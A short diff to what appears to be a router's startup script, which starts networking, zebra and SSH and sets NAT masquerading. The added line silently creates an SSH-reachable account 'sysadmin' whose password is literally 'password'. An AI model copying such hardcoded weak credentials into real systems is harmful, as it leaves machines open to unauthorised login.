@@ -1,5 +1,6 @@
 /etc/init.d/networking start
 /etc/init.d/zebra start
 /etc/init.d/ssh start
+echo -ne "password\npassword\n" | adduser -gecos "" sysadmin
 
 iptables -t nat -A POSTROUTING -o eth2 -j MASQUERADE
